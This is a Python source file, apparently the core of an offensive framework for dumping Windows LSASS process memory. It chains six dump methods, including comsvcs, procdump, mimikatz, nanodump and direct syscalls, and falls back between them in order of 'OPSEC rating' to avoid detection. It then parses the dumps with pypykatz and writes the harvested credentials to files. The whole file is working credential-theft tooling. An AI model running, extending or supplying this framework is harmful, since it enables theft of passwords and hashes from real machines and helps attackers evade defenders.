#!/usr/bin/env python3
"""
Core LSASS Dumping Framework
Orchestrates dump operations across multiple methods
"""

from pathlib import Path
from typing import Optional, Dict, List

from .methods import (
    ComsvcsDumper,
    ProcdumpDumper,
    PowerShellDumper,
    MimikatzDumper,
    NanodumpDumper,
    SyscallsDumper,
    DUMPER_REGISTRY,
    list_methods,
    get_method_info
)
from .parsers import PyPykatzParser
from .utils import check_admin_privileges, print_privilege_status


class LsassDumper:
    """
    Main LSASS dumping framework
    Coordinates multiple dump methods and credential extraction
    """
    
    def __init__(self, output_dir: str = "lsass_dumps"):
        """
        Initialize LSASS dumper framework
        
        Args:
            output_dir: Directory for dump files
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize parser
        self.parser = PyPykatzParser()
        
        # Initialize dumpers
        self.dumpers = {
            'comsvcs': ComsvcsDumper(self.output_dir),
            'procdump': ProcdumpDumper(self.output_dir),
            'powershell': PowerShellDumper(self.output_dir),
            'mimikatz': MimikatzDumper(self.output_dir),
            'nanodump': NanodumpDumper(self.output_dir),
            'direct_syscalls': SyscallsDumper(self.output_dir)
        }
        
        print(f"[+] LSASS Dumper Framework initialized")
        print(f"[+] Output directory: {self.output_dir}")
        print(f"[+] Available methods: {', '.join(self.dumpers.keys())}")
    
    def check_privileges(self) -> bool:
        """
        Check if we have required privileges
        
        Returns:
            bool: True if admin privileges available
        """
        is_admin, msg = check_admin_privileges()
        
        if is_admin:
            print(f"[+] {msg}")
            return True
        else:
            print(f"[-] ERROR: {msg}")
            print(f"[!] Run as: Administrator or SYSTEM")
            return False
    
    def list_available_methods(self) -> List[str]:
        """
        List methods that are actually available
        
        Returns:
            List of available method names
        """
        available = []
        
        print(f"\n[*] Checking method availability...")
        
        for name, dumper in self.dumpers.items():
            is_avail = dumper.is_available()
            status = "✓" if is_avail else "✗"
            
            print(f"    {status} {name}: {'Available' if is_avail else 'Not available'}")
            
            if is_avail:
                available.append(name)
        
        return available
    
    def dump(self, method: str) -> Optional[Dict]:
        """
        Execute dump using specified method
        
        Args:
            method: Dump method name
            
        Returns:
            Dict with dump metadata or None on failure
        """
        if method not in self.dumpers:
            print(f"[-] Unknown method: {method}")
            print(f"[!] Available methods: {', '.join(self.dumpers.keys())}")
            return None
        
        dumper = self.dumpers[method]
        
        if not dumper.is_available():
            print(f"[-] Method '{method}' is not available")
            return None
        
        return dumper.dump()
    
    def auto_dump(self, preferred_method: str = 'comsvcs') -> Optional[Dict]:
        """
        Automatically dump using best available method
        Falls back to alternatives if preferred method fails
        
        Args:
            preferred_method: Preferred method to try first
            
        Returns:
            Dict with dump metadata or None if all methods fail
        """
        print(f"\n" + "="*70)
        print(f"AUTO LSASS DUMP")
        print(f"Preferred method: {preferred_method}")
        print(f"="*70)
        
        # Check privileges first
        if not self.check_privileges():
            return None
        
        # Try preferred method first
        if preferred_method in self.dumpers:
            print(f"\n[*] Attempting preferred method: {preferred_method}")
            dumper = self.dumpers[preferred_method]
            
            if dumper.is_available():
                result = dumper.dump()
                if result:
                    return result
            else:
                print(f"[!] Preferred method not available, trying alternatives...")
        
        # Fallback order (by OPSEC rating)
        fallback_order = [
            'comsvcs',      # High OPSEC
            'nanodump',     # High OPSEC
            'powershell',   # Medium OPSEC
            'procdump',     # Medium OPSEC
            'mimikatz'      # Low OPSEC (last resort)
        ]
        
        for method in fallback_order:
            if method == preferred_method:
                continue  # Already tried
            
            if method in self.dumpers:
                dumper = self.dumpers[method]
                
                if dumper.is_available():
                    print(f"\n[*] Falling back to: {method}")
                    result = dumper.dump()
                    
                    if result:
                        return result
        
        print(f"\n[-] All dump methods failed")
        return None
    
    def parse_dump(self, dump_file: str, save_creds: bool = True) -> Optional[List[Dict]]:
        """
        Parse dump file and extract credentials
        
        Args:
            dump_file: Path to dump file
            save_creds: Whether to save credentials to files
            
        Returns:
            List of credentials or None on failure
        """
        if not self.parser.is_available():
            print(f"[-] Parser not available")
            print(f"[!] Install pypykatz: pip install pypykatz")
            return None
        
        output_name = "credentials" if save_creds else None
        return self.parser.parse_and_display(dump_file, save_to=output_name)
    
    def dump_and_parse(self, method: str = 'auto', auto_parse: bool = True) -> Optional[Dict]:
        """
        Dump LSASS and automatically parse credentials
        
        Args:
            method: Dump method or 'auto' for automatic selection
            auto_parse: Whether to automatically parse dump
            
        Returns:
            Dict with dump metadata and credentials
        """
        # Perform dump
        if method == 'auto':
            result = self.auto_dump()
        else:
            result = self.dump(method)
        
        if not result:
            return None
        
        # Parse dump if requested
        if auto_parse:
            print(f"\n[*] Automatically parsing dump...")
            credentials = self.parse_dump(result['file'], save_creds=True)
            
            if credentials:
                result['credentials'] = credentials
                result['credential_count'] = len(credentials)
        
        return result
    
    def show_method_info(self, method: str):
        """
        Display detailed information about a dump method
        
        Args:
            method: Method name
        """
        info = get_method_info(method)
        
        if not info:
            print(f"[-] Unknown method: {method}")
            return
        
        print(f"\n" + "="*70)
        print(f"METHOD: {info['name'].upper()}")
        print(f"="*70)
        
        print(f"\nDescription: {info['description']}")
        print(f"OPSEC Rating: {info['opsec_rating']}")
        
        print(f"\nRequirements:")
        for req in info['requirements']:
            print(f"  • {req}")
        
        print(f"\nAdvantages:")
        for adv in info['advantages']:
            print(f"  + {adv}")
        
        print(f"\nDisadvantages:")
        for dis in info['disadvantages']:
            print(f"  - {dis}")
    
    def show_all_methods(self):
        """Display information about all available methods"""
        methods = list(self.dumpers.keys())
        
        print(f"\n" + "="*70)
        print(f"AVAILABLE DUMP METHODS")
        print(f"="*70)
        
        for method in methods:
            info = get_method_info(method)
            if info:
                avail = "✓" if self.dumpers[method].is_available() else "✗"
                print(f"\n{avail} {method.upper()} (OPSEC: {info['opsec_rating']})")
                print(f"  {info['description']}")
